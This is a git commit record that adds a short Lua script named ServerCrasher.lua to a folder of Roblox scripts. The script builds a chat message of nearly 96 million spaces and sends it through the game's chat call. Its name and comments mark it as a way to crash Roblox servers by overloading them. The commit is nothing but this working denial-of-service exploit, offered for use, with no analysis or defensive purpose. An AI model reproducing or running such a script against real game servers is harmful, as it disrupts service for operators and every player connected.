e8c98fee7f0aada730b6efe252b698fc119b287a
Jam The Adventurer <94430800+JamTheAdventurer@users.noreply.github.com>
2022-05-20 20:56:33 +0800

    Create ServerCrasher.lua

---
+++ .github/RobloxScripts/ServerCrasher.lua
@@ -0,0 +1,7 @@
+--Script made by Diemiers#4209-Qwerty#9972
+--Method by Roblox
+
+local v =96000000 --Maximal bit stream on client
+-- (96000000 - 12) -- Maximal bit stream that server accept +-2
+local msg = ""..string.rep(" ",(v - 12))
+game.Players:Chat(msg)
